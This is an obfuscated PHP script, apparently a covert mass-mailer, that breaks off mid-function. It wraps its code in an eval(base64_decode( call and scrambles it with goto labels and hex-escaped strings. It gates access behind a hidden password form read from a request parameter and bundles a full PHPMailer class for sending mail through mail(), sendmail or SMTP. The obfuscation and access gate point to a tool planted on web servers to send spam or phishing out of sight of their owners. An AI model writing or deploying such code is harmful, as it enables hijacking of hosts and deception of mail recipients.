<?php eval(base64_decode('
 goto w5Vke; MqO5G: echo $owl["\167\x65\142\x73\151\164\x65"]; goto dHcSU; SzMBn: class phpmailerException extends Exception { public function errorMessage() { $errorMsg = "\74\163\x74\162\x6f\x6e\147\x3e" . $this->getMessage() . "\74\x2f\163\164\x72\x6f\156\x67\x3e\74\x62\162\x20\x2f\76\12"; return $errorMsg; } } goto d1gfg; yVEnN: if (!empty($password) && $_SESSION[$sessioncode] != $password) { if (isset($_REQUEST["\160\x61\x73\x73"]) and $_REQUEST["\160\141\x73\163"] == $password) { $_SESSION[$sessioncode] = $password; } else { print "\x3c\160\x72\x65\40\141\x6c\151\147\156\x3d\143\x65\x6e\164\145\162\76\74\146\157\x72\155\x20\x6d\x65\x74\x68\x6f\144\75\160\157\163\x74\76\120\141\163\163\167\x6f\x72\x64\x3a\x20\x3c\x69\x6e\160\x75\164\x20\164\171\160\145\x3d\x27\x70\141\x73\x73\x77\157\x72\144\47\x20\156\x61\x6d\145\x3d\x27\160\141\163\x73\47\x3e\x3c\x69\156\160\165\x74\40\164\x79\160\145\75\47\163\x75\x62\155\x69\164\47\x20\166\x61\x6c\165\145\x3d\x27\x3e\76\47\x3e\x3c\x2f\x66\157\x72\x6d\x3e\x3c\x2f\x70\162\x65\x3e"; die; } } goto D_fXR; lgWzV: class PHPMailer { const CHARSET_ASCII = "\x75\x73\55\141\163\x63\x69\x69"; const CHARSET_ISO88591 = "\x69\163\x6f\x2d\x38\x38\65\x39\55\61"; const CHARSET_UTF8 = "\165\164\x66\55\70"; const CONTENT_TYPE_PLAINTEXT = "\x74\145\170\x74\57\160\x6c\x61\151\156"; const CONTENT_TYPE_TEXT_CALENDAR = "\x74\x65\170\x74\57\143\x61\154\x65\x6e\144\x61\x72"; const CONTENT_TYPE_TEXT_HTML = "\x74\145\170\164\57\150\164\x6d\154"; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = "\155\x75\x6c\164\x69\x70\x61\162\164\x2f\141\154\x74\x65\162\156\141\x74\x69\x76\x65"; const CONTENT_TYPE_MULTIPART_MIXED = "\155\x75\154\x74\151\160\141\162\x74\x2f\155\x69\170\x65\x64"; const CONTENT_TYPE_MULTIPART_RELATED = "\x6d\165\154\164\151\x70\x61\x72\164\57\162\x65\x6c\141\164\x65\144"; const ENCODING_7BIT = "\x37\142\151\x74"; const ENCODING_8BIT = "\x38\142\151\164"; const ENCODING_BASE64 = "\142\141\x73\x65\66\x34"; const ENCODING_BINARY = "\x62\151\156\141\162\171"; const ENCODING_QUOTED_PRINTABLE = "\161\165\x6f\164\x65\x64\55\x70\x72\x69\156\x74\141\x62\154\x65"; const ENCRYPTION_STARTTLS = "\x74\x6c\x73"; const ENCRYPTION_SMTPS = "\163\x73\154"; const ICAL_METHOD_REQUEST = "\122\x45\121\x55\x45\x53\124"; const ICAL_METHOD_PUBLISH = "\120\125\102\114\111\123\x48"; const ICAL_METHOD_REPLY = "\122\105\120\x4c\x59"; const ICAL_METHOD_ADD = "\x41\x44\104"; const ICAL_METHOD_CANCEL = "\103\101\x4e\x43\105\x4c"; const ICAL_METHOD_REFRESH = "\x52\x45\106\x52\x45\123\x48"; const ICAL_METHOD_COUNTER = "\103\x4f\125\116\x54\x45\x52"; const ICAL_METHOD_DECLINECOUNTER = "\x44\x45\103\114\x49\x4e\x45\103\x4f\125\x4e\x54\105\x52"; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = ''; public $FromName = ''; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected static $IcalMethods = array(self::ICAL_METHOD_REQUEST, self::ICAL_METHOD_PUBLISH, self::ICAL_METHOD_REPLY, self::ICAL_METHOD_ADD, self::ICAL_METHOD_CANCEL, self::ICAL_METHOD_REFRESH, self::ICAL_METHOD_COUNTER, self::ICAL_METHOD_DECLINECOUNTER); protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = "\155\141\151\x6c"; public $Sendmail = "\x2f\x75\x73\162\57\163\142\x69\156\57\x73\145\156\x64\155\x61\x69\154"; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = "\154\157\x63\x61\154\x68\157\163\164"; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $SMTPXClient = array(); protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = "\145\x63\150\x6f"; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = "\160\150\160"; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); public $UseSMTPUTF8 = false; protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = "\66\x2e\x31\60\56\x30"; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = "\15\xa"; const FWS = "\x20"; protected static $LE = self::CRLF; const MAIL_MAX_LINE_LENGTH = 63; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($exceptions = null) { if (null !== $exceptions) { $this->exceptions = (bool) $exceptions; } $this->Debugoutput = strpos(PHP_SAPI, "\x63\x6c\151") !== false ? "\x65\143\x68\157" : "\x68\164\x6d\154"; } public function __destruct() { $this->smtpClose(); } private function mailPassthru($to, $subject, $body, $header, $params) { if ((int) ini_get("\155\142\163\164\162\151\156\x67\56\146\x75\x6e\143\x5f\157\166\145\162\154\157\141\x64") & 1) { $subject = $this->secureHeader($subject); } else { $subject = $this->encodeHeader($this->secureHeader($subject)); } $this->edebug("\x53\145\x6e\144\x69\156\147\x20\167\151\x74\x68\40\x6d\x61\x69\154\x28\x29"); $this->edebug("\123\145\156\x64\x6d\141\x69\x6c\x20\x70\141\x74\x68\x3a\40" . ini_get("\x73\145\x6e\x64\x6d\x61\x69\154\x5f\x70\x61\x74\150")); $this->edebug("\105\x6e\166\x65\x6c\157\160\145\x20\x73\x65\x6e\x64\145\x72\x3a\x20{$this->Sender}"); $this->edebug("\124\157\72\x20{$to}"); $this->edebug("\123\165\142\x6a\145\143\164\x3a\40{$subject}"); $this->edebug("\x48\145\x61\144\x65\x72\x73\x3a\x20{$header}"); if (!$this->UseSendmailOptions || null === $params) { $result = @mail($to, $subject, $body, $header); } else { $this->edebug("\101\x64\x64\151\x74\x69\x6f\x6e\141\154\x20\160\141\x72\x61\155\x73\72\40{$params}"); $result = @mail($to, $subject, $body, $header, $params); } $this->edebug("\122\x65\163\165\154\164\72\40" . ($result ? "\164\162\165\145" : "\x66\141\x6c\x73\145")); return $result; } protected function edebug($str) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug(rtrim($str, "\15\12")); return; } if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, array("\145\162\x72\x6f\x72\137\x6c\x6f\147", "\150\x74\155\154", "\x65\143\150\157"))) { call_user_func($this->Debugoutput, $str, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case "\x65\162\x72\157\x72\x5f\x6c\157\x67": error_log($str); break; case "\x68\164\155\x6c": echo htmlentities(preg_replace("\x2f\x5b\134\x72\134\156\135\53\57", '', $str), ENT_QUOTES, "\125\124\x46\55\70"), "\x3c\x62\x72\76\12"; break; case "\145\143\x68\157": default: $str = preg_replace("\57\134\x72\134\x6e\x7c\134\162\x2f\x6d", "\xa", $str); echo gmdate("\131\x2d\155\x2d\x64\40\x48\x3a\x69\72\x73"), "\x9", trim(str_replace("\xa", "\xa\40\x20\x20\40\x20\x20\x20\x20\40\x20\40\x20\x20\x20\x20\x20\40\x20\40\x9\x20\x20\x20\40\40\40\x20\x20\x20\40\40\40\x20\x20\40\40\x20\x20", trim($str))), "\12"; } } public function isHTML($isHtml = true) { if ($isHtml) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = "\163\155\164\x70"; } public function isMail() { $this->Mailer = "\x6d\141\x69\154"; } public function isSendmail() { $ini_sendmail_path = ini_get("\x73\x65\x6e\x64\x6d\141\x69\x6c\x5f\x70\141\164\150"); if (false === stripos($ini_sendmail_path, "\x73\x65\156\x64\x6d\x61\151\x6c")) { $this->Sendmail = "\x2f\x75\x73\162\57\163\142\x69\x6e\x2f\x73\145\x6e\x64\155\x61\x69\x6c"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\163\145\x6e\144\x6d\141\x69\x6c"; } public function isQmail() { $ini_sendmail_path = ini_get("\163\x65\156\x64\155\x61\x69\154\137\160\x61\164\x68"); if (false === stripos($ini_sendmail_path, "\x71\x6d\x61\151\154")) { $this->Sendmail = "\x2f\x76\x61\162\x2f\161\155\x61\151\154\x2f\142\x69\x6e\57\161\x6d\x61\151\x6c\x2d\151\156\x6a\x65\143\x74"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\161\155\x61\151\x6c"; } public function addAddress($address, $name = '') { return $this->addOrEnqueueAnAddress("\x74\x6f", $address, $name); } public function addCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\143\143", $address, $name); } public function addBCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\142\x63\143", $address, $name); } public function addReplyTo($address, $name = '') { return $this->addOrEnqueueAnAddress("\x52\145\x70\x6c\171\55\x54\157", $address, $name); } protected function addOrEnqueueAnAddress($kind, $address, $name) { $pos = false; if ($address !== null) { $address = trim($address); $pos = strrpos($address, "\100"); } if (false === $pos) { $error_message = sprintf("\x25\x73\40\x28\45\163\51\72\40\x25\x73", $this->lang("\x69\156\x76\141\x6c\x69\144\137\x61\144\144\162\145\163\163"), $kind, $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if ($name !== null && is_string($name)) { $name = trim(preg_replace("\x2f\133\134\x72\x5c\x6e\135\53\x2f", '', $name)); } else { $name = ''; } $params = array($kind, $address, $name); if ($this->has8bitChars(substr($address, ++$pos))) { if (static::idnSupported()) { if ("\x52\x65\160\x6c\171\x2d\x54\x6f" !== $kind) { if (!array_key_exists($address, $this->RecipientsQueue)) { $this->RecipientsQueue[$address] = $params; return true; } } elseif (!array_key_exists($address, $this->ReplyToQueue)) { $this->ReplyToQueue[$address] = $params; return true; } } return false; } return call_user_func_array(array($this, "\141\144\x64\x41\156\x41\x64\x64\x72\x65\x73\163"), $params); } public function setBoundaries() { $this->uniqueid = $this->generateId(); $this->boundary[1] = "\142\61\x3d\x5f" . $this->uniqueid; $this->boundary[2] = "\142\x32\75\137" . $this->uniqueid; $this->boundary[3] = "\x62\x33\x3d\137" . $this->uniqueid; } protected function addAnAddress($kind, $address, $name = '') { if (self::$validator === "\x70\x68\x70" && (bool) preg_match("\57\x5b\x5c\x78\x38\60\x2d\134\x78\106\x46\x5d\57", $address)) { $this->CharSet = self::CHARSET_UTF8; self::$validator = "\145\x61\151"; } if (!in_array($kind, array("\x74\x6f", "\143\x63", "\142\143\143", "\x52\145\x70\x6c\x79\55\x54\157"))) { $error_message = sprintf("\x25\163\x3a\x20\45\163", $this->lang("\111\156\x76\x61\154\151\144\x20\162\x65\143\151\x70\151\145\156\164\40\153\x69\x6e\144"), $kind); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if (!static::validateAddress($address)) { $error_message = sprintf("\x25\x73\x20\50\x25\x73\51\x3a\40\x25\x73", $this->lang("\151\x6e\166\x61\x6c\151\144\x5f\141\x64\144\x72\x65\163\x73"), $kind, $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if ("\122\x65\160\154\171\55\124\157" !== $kind) { if (!array_key_exists(strtolower($address), $this->all_recipients)) { $this->{$kind}[] = array($address, $name); $this->all_recipients[strtolower($address)] = true; return true; } } elseif (!array_key_exists(strtolower($address), $this->ReplyTo)) { $this->ReplyTo[strtolower($address)] = array($address, $name); return true; } return false; } public static function parseAddresses($addrstr, $useimap = true, $charset = self::CHARSET_ISO88591) { $addresses = array(); if ($useimap && function_exists("\x69\155\x61\x70\137\162\146\x63\x38\62\62\x5f\160\x61\162\163\x65\137\141\144\x72\154\151\163\164")) { $list = imap_rfc822_parse_adrlist($addrstr, ''); imap_errors(); foreach ($list as $address) { if ("\x2e\x53\131\x4e\124\x41\x58\x2d\105\x52\x52\x4f\x52\x2e" !== $address->host && static::validateAddress($address->mailbox . "\100" . $address->host)) { if (property_exists($address, "\x70\145\162\163\157\x6e\141\154") && defined("\x4d\x42\x5f\x43\101\x53\x45\137\x55\120\x50\x45\122") && preg_match("\x2f\136\x3d\x5c\x3f\56\x2a\x5c\77\75\x24\x2f\163", $address->personal)) { $origCharset = mb_internal_encoding(); mb_internal_encoding($charset); $address->personal = str_replace("\137", "\x3d\x32\60", $address->personal); $address->personal = mb_decode_mimeheader($address->personal); mb_internal_encoding($origCharset); } $addresses[] = array("\x6e\x61\x6d\x65" => property_exists($address, "\x70\145\x72\x73\x6f\x6e\x61\154") ? $address->personal : '', "\141\x64\144\162\145\x73\163" => $address->mailbox . "\x40" . $address->host); } } } else { $list = explode("\54", $addrstr); foreach ($list as $address) { $address = trim($address); if (strpos($address, "\x3c") === false) { if (static::validateAddress($address)) { $addresses[] = array("\x6e\x61\x6d\x65" => '', "\141\144\144\162\x65\163\x73" => $address); } } else { list($name, $email) = explode("\74", $address); $email = trim(str_replace("\76", '', $email)); $name = trim($name); if (static::validateAddress($email)) { if (defined("\115\x42\137\103\101\x53\x45\x5f\x55\120\x50\105\x52") && preg_match("\x2f\136\x3d\134\x3f\x2e\x2a\x5c\77\x3d\x24\57\x73", $name)) { $origCharset = mb_internal_encoding(); mb_internal_encoding($charset); $name = str_replace("\137", "\75\x32\60", $name); $name = mb_decode_mimeheader($name); mb_internal_encoding($origCharset); } $addresses[] = array("\156\141\x6d\x65" => trim($name, "\47\42\40"), "\x61\144\x64\162\x65\163\163" => $email); } } } } return $addresses; } public function setFrom($address, $name = '', $auto = true) { $address = trim((string) $address); $name = trim(preg_replace("\57\133\x5c\x72\x5c\x6e\135\53\x2f", '', $name)); $pos = strrpos($address, "\x40"); if (false === $pos || (!$this->has8bitChars(substr($address, ++$pos)) || !static::idnSupported()) && !static::validateAddress($address)) { $error_message = sprintf("\45\x73\x20\x28\106\x72\157\155\x29\72\x20\45\163", $this->lang("\151\x6e\x76\x61\x6c\x69\x64\137\141\144\x64\x72\x65\163\163"), $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } $this->From = $address; $this->FromName = $name; if ($auto && empty($this->Sender)) { $this->Sender = $address; } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($address, $patternselect = null) { if (null === $patternselect) { $patternselect = static::$validator; } if (is_callable($patternselect) && !is_string($patternselect)) { return call_user_func($patternselect, $address); } if (strpos($address, "\12") !== false || strpos($address, "\15") !== false) { return false; } switch ($patternselect) { case "\160\x63\162\x65": case "\x70\143\x72\x65\x38": return (bool) preg_match("\57\x5e\x28\77\x21\x28\77\x3e\50\77\61\51\x22\77\50\x3f\x3e\x5c\x5c\133\40\55\176\x5d\x7c\133\136\42\x5d\x29\42\77\50\x3f\x31\51\x29\173\62\65\65\x2c\175\x29\x28\77\41\x28\77\76\50\77\x31\51\42\x3f\50\x3f\x3e\134\x5c\x5b\40\55\x7e\x5d\174\133\x5e\42\135\x29\x22\x3f\x28\x3f\61\x29\x29\x7b\66\65\x2c\x7d\x40\51" . "\x28\50\77\x3e\50\77\x3e\x28\77\76\50\50\x3f\76\50\77\x3e\x28\77\76\x5c\x78\60\104\134\x78\x30\x41\x29\x3f\x5b\x5c\164\40\135\x29\53\x7c\50\77\76\133\x5c\x74\x20\135\x2a\134\170\x30\x44\x5c\x78\x30\101\51\77\x5b\134\x74\40\x5d\x2b\x29\x3f\51\x28\x5c\50\50\77\x3e\x28\x3f\62\x29" . "\50\77\x3e\x5b\x5c\170\x30\x31\55\x5c\170\x30\x38\x5c\x78\x30\x42\134\x78\x30\103\x5c\170\x30\105\55\47\52\x2d\134\x5b\x5c\135\55\134\170\x37\x46\x5d\174\x5c\134\x5b\x5c\x78\60\60\55\x5c\x78\x37\106\135\x7c\50\77\63\x29\x29\x29\52\50\x3f\x32\51\x5c\x29\51\x29\53\50\77\62\51\51\174\x28\77\x32\x29\51\77\x29" . "\x28\133\x21\x23\x2d\x27\x2a\x2b\134\x2f\55\x39\75\77\x5e\x2d\176\55\135\53\174\42\x28\77\x3e\x28\x3f\x32\x29\50\x3f\x3e\133\134\x78\60\61\x2d\134\170\x30\x38\x5c\170\x30\x42\x5c\x78\x30\103\134\170\60\x45\x2d\x21\43\55\x5c\x5b\134\x5d\x2d\x5c\170\x37\106\x5d\174\134\x5c\x5b\x5c\170\x30\60\x2d\x5c\170\x37\106\135\51\51\52" . "\50\x3f\62\51\42\x29\50\77\x3e\50\x3f\x31\x29\134\x2e\50\x3f\61\x29\x28\x3f\64\51\x29\52\50\x3f\61\51\x40\50\x3f\x21\50\x3f\x31\51\133\x61\x2d\x7a\x30\x2d\x39\x2d\135\173\66\x34\54\x7d\51\50\x3f\x31\51\x28\x3f\x3e\50\133\x61\55\x7a\60\x2d\x39\x5d\x28\x3f\x3e\133\x61\55\172\60\55\x39\x2d\135\x2a\x5b\141\x2d\x7a\x30\55\x39\135\51\77\51" . "\x28\x3f\76\x28\77\61\51\x5c\56\50\77\41\x28\77\x31\x29\x5b\141\55\172\x30\x2d\x39\x2d\x5d\173\66\x34\x2c\x7d\51\50\x3f\x31\x29\x28\x3f\x35\51\51\173\x30\54\61\x32\x36\x7d\x7c\134\x5b\x28\77\72\x28\x3f\76\111\x50\x76\x36\x3a\x28\x3f\76\50\133\141\55\146\x30\55\x39\x5d\173\x31\x2c\x34\x7d\51\50\x3f\76\x3a\x28\x3f\66\51\x29\173\x37\175" . "\x7c\x28\77\41\50\77\x3a\x2e\x2a\x5b\141\55\146\x30\55\x39\135\x5b\72\x5c\135\x5d\51\x7b\x38\x2c\175\x29\50\x28\77\x36\51\x28\x3f\x3e\x3a\50\77\66\x29\51\173\x30\x2c\x36\x7d\x29\77\x3a\x3a\50\77\67\x29\77\51\51\x7c\50\x3f\x3e\50\x3f\76\x49\120\x76\x36\72\x28\x3f\76\50\77\x36\51\50\x3f\x3e\72\x28\77\66\x29\51\173\x35\175\72" . "\174\50\x3f\x21\50\x3f\72\56\52\133\x61\x2d\146\x30\55\x39\x5d\x3a\x29\x7b\66\54\175\x29\x28\77\x38\x29\x3f\x3a\72\x28\77\x3e\x28\50\77\x36\x29\x28\x3f\x3e\x3a\x28\77\66\x29\51\x7b\x30\x2c\64\175\x29\72\51\x3f\51\x29\77\50\x32\x35\133\60\x2d\x35\135\x7c\62\133\60\55\64\x5d\x5b\60\55\71\135\174\61\x5b\x30\x2d\71\x5d\173\62\175" . "\x7c\133\x31\x2d\x39\135\x3f\x5b\x30\55\71\135\x29\x28\x3f\76\x5c\x2e\x28\77\71\51\51\173\x33\x7d\x29\51\134\135\51\50\x3f\61\x29\44\x2f\151\x73\104", $address); case "\x68\164\x6d\154\65": return (bool) preg_match("\57\136\x5b\141\55\172\x41\x2d\132\x30\x2d\x39\56\41\43\x24\45\x26\x27\x2a\53\x5c\x2f\x3d\77\136\137\x60\173\x7c\175\x7e\x2d\135\53\100\x5b\x61\55\172\101\x2d\132\x30\x2d\x39\x5d\x28\x3f\72\x5b\141\x2d\172\x41\x2d\x5a\60\55\x39\x2d\135\173\x30\54\66\x31\175" . "\133\x61\55\x7a\101\x2d\x5a\x30\x2d\71\x5d\51\77\x28\77\72\x5c\56\133\x61\x2d\x7a\x41\x2d\x5a\x30\x2d\x39\135\50\x3f\x3a\x5b\x61\x2d\172\101\x2d\132\60\x2d\x39\x2d\x5d\173\x30\x2c\66\61\175\x5b\141\55\x7a\101\55\132\60\x2d\x39\135\51\77\x29\x2a\44\57\x73\x44", $address); case "\x65\x61\151": return (bool) preg_match("\x2f\136\x5b\55\x5c\160\x7b\x4c\175\134\x70\x7b\x4e\x7d\x5c\x70\x7b\x4d\x7d\x2e\41\x23\x24\45\46\47\52\53\134\x2f\x3d\77\136\137\140\173\x7c\x7d\x7e\x5d\x2b\x40\x5b\x5c\x70\173\x4c\x7d\x5c\x70\x7b\x4e\x7d\x5c\x70\173\115\x7d\135\x28\x3f\x3a\x5b\134\160\x7b\114\175\134\x70\x7b\x4e\x7d\x5c\160\173\115\175\55\135\x7b\60\x2c\x36\61\175" . "\133\134\160\173\x4c\x7d\134\x70\x7b\x4e\x7d\x5c\x70\x7b\115\x7d\x5d\x29\77\50\x3f\x3a\x5c\x2e\x5b\134\160\x7b\114\x7d\134\x70\173\116\175\x5c\160\x7b\x4d\175\135" . "\x28\x3f\72\x5b\x2d\x5c\160\x7b\x4c\175\x5c\160\173\116\x7d\x5c\x70\x7b\x4d\175\135\173\60\54\x36\61\x7d\x5b\x5c\x70\x7b\x4c\175\134\x70\173\x4e\175\x5c\160\173\115\x7d\135\51\77\51\52\x24\x2f\x75\x73\x44", $address); case "\x70\150\x70": default: return filter_var($address, FILTER_VALIDATE_EMAIL) !== false; } } public static function idnSupported() { return function_exists("\151\144\x6e\137\x74\157\x5f\141\163\143\151\151") && function_exists("\155\142\137\x63\x6f\x6e\x76\145\x72\x74\137\x65\x6e\x63\x6f\144\151\x6e\147"); } public function punyencodeAddress($address) { $pos = strrpos($address, "\x40"); if (!empty($this->CharSet) && false !== $pos && static::idnSupported()) { $domain = substr($address, ++$pos); if ($this->has8bitChars($domain) && @mb_check_encoding($domain, $this->CharSet)) { $domain = mb_convert_encoding($domain, self::CHARSET_UTF8, $this->CharSet); $errorcode = 0; if (defined("\111\116\124\114\137\111\x44\x4e\x41\x5f\126\101\x52\x49\x41\116\x54\x5f\125\124\x53\x34\66")) { $punycode = idn_to_ascii($domain, \IDNA_DEFAULT | \IDNA_USE_STD3_RULES | \IDNA_CHECK_BIDI | \IDNA_CHECK_CONTEXTJ | \IDNA_NONTRANSITIONAL_TO_ASCII, \INTL_IDNA_VARIANT_UTS46); } elseif (defined("\x49\116\x54\114\137\111\104\116\101\x5f\x56\101\x52\x49\x41\x4e\124\137\62\60\60\x33")) { $punycode = idn_to_ascii($domain, $errorcode, \INTL_IDNA_VARIANT_2003); } else { $punycode = idn_to_ascii($domain, $errorcode); } if (false !== $punycode) { return substr($address, 0, $pos) . $punycode; } } } return $address; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $exc) { $this->mailHeader = ''; $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function preSend() { if ("\163\x6d\x74\x70" === $this->Mailer || "\x6d\141\151\154" === $this->Mailer && (\PHP_VERSION_ID >= 80000 || stripos(PHP_OS, "\127\x49\116") === 0)) { static::setLE(self::CRLF); } else { static::setLE(PHP_EOL); } if ("\x6d\141\x69\x6c" === $this->Mailer && (\PHP_VERSION_ID >= 70000 && \PHP_VERSION_ID < 70017 || \PHP_VERSION_ID >= 70100 && \PHP_VERSION_ID < 70103) && ini_get("\x6d\x61\151\154\56\x61\x64\144\x5f\x78\137\150\x65\141\x64\x65\162") === "\x31" && stripos(PHP_OS, "\127\111\116") === 0) { trigger_error($this->lang("\x62\x75\x67\147\171\137\x70\x68\x70"), E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; if (static::CHARSET_UTF8 === strtolower($this->CharSet) && ($this->anyAddressHasUnicodeLocalPart($this->RecipientsQueue) || $this->anyAddressHasUnicodeLocalPart(array_keys($this->all_recipients)) || $this->anyAddressHasUnicodeLocalPart($this->ReplyToQueue) || $this->addressHasUnicodeLocalPart($this->From))) { $this->UseSMTPUTF8 = true; } foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) { if (!$this->UseSMTPUTF8) { $params[1] = $this->punyencodeAddress($params[1]); } call_user_func_array(array($this, "\x61\x64\x64\x41\x6e\101\x64\x64\x72\145\163\x73"), $params); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang("\x70\162\157\166\x69\144\145\137\141\144\144\162\x65\x73\163"), self::STOP_CRITICAL); } foreach (array("\x46\162\157\155", "\x53\x65\x6e\144\145\x72", "\103\x6f\x6e\146\x69\162\x6d\x52\x65\141\x64\x69\x6e\x67\x54\157") as $address_kind) { if ($this->{$address_kind} === null) { $this->{$address_kind} = ''; continue; } $this->{$address_kind} = trim($this->{$address_kind}); if (empty($this->{$address_kind})) { continue; } $this->{$address_kind} = $this->punyencodeAddress($this->{$address_kind}); if (!static::validateAddress($this->{$address_kind})) { $error_message = sprintf("\x25\163\x20\x28\x25\163\51\x3a\x20\x25\x73", $this->lang("\x69\156\x76\x61\154\151\x64\137\x61\144\144\x72\x65\163\163"), $address_kind, $this->{$address_kind}); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty && empty($this->Body)) { throw new Exception($this->lang("\145\155\x70\164\x79\137\155\145\x73\163\141\x67\x65"), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $tempheaders = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $tempheaders; if ("\x6d\141\151\154" === $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend("\x54\157", $this->to); } else { $this->mailHeader .= $this->headerLine("\x54\x6f", "\x75\156\144\x69\x73\143\x6c\157\163\145\144\x2d\162\x65\x63\151\x70\x69\145\x6e\x74\x73\72\x3b"); } $this->mailHeader .= $this->headerLine("\123\165\142\152\x65\143\x74", $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) && !empty($this->DKIM_selector) && (!empty($this->DKIM_private_string) || !empty($this->DKIM_private) && static::isPermittedPath($this->DKIM_private) && file_exists($this->DKIM_private))) { $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = static::stripTrailingWSP($this->MIMEHeader) . static::$LE . static::normalizeBreaks($header_dkim) . static::$LE; } return true; } catch (Exception $exc) { $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function postSend() { try { switch ($this->Mailer) { case "\x73\145\x6e\x64\155\x61\x69\x6c": case "\161\155\x61\x69\x6c": return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case "\163\x6d\x74\x70": return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case "\x6d\141\151\154": return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sendMethod = $this->Mailer . "\123\x65\156\x64"; if (method_exists($this, $sendMethod)) { return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->Mailer === "\163\155\x74\160" && $this->SMTPKeepAlive == true && $this->smtp->connected()) { $this->smtp->reset(); } if ($this->exceptions) { throw $exc; } } return false; } protected function sendmailSend($header, $body) { if ($this->Mailer === "\161\x6d\x61\151\154") { $this->edebug("\x53\x65\156\x64\x69\x6e\x67\x20\167\151\164\150\40\x71\155\x61\x69\154"); } else { $this->edebug("\123\x65\x6e\x64\151\156\x67\40\167\x69\164\150\40\x73\145\156\x64\155\x61\x69\x6c"); } $header = static::stripTrailingWSP($header) . static::$LE . static::$LE; $sendmail_from_value = ini_get("\x73\145\x6e\144\x6d\x61\151\154\137\x66\x72\x6f\x6d"); if (empty($this->Sender) && !empty($sendmail_from_value)) { $this->Sender = ini_get("\x73\x65\x6e\144\x6d\x61\x69\x6c\137\146\x72\157\x6d"); } if (!empty($this->Sender) && static::validateAddress($this->Sender) && self::isShellSafe($this->Sender)) { if ($this->Mailer === "\161\155\x61\x69\154") { $sendmailFmt = "\x25\x73\40\55\146\45\x73"; } else { $sendmailFmt = "\x25\163\x20\55\157\x69\x20\x2d\x66\x25\x73\40\55\164"; } } else { $sendmailFmt = "\45\x73\40\55\x6f\151\40\x2d\164"; } $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender); $this->edebug("\123\x65\x6e\x64\155\x61\x69\154\x20\160\x61\164\x68\x3a\40" . $this->Sendmail); $this->edebug("\123\x65\x6e\x64\155\141\151\154\40\143\x6f\x6d\x6d\x61\156\144\x3a\x20" . $sendmail); 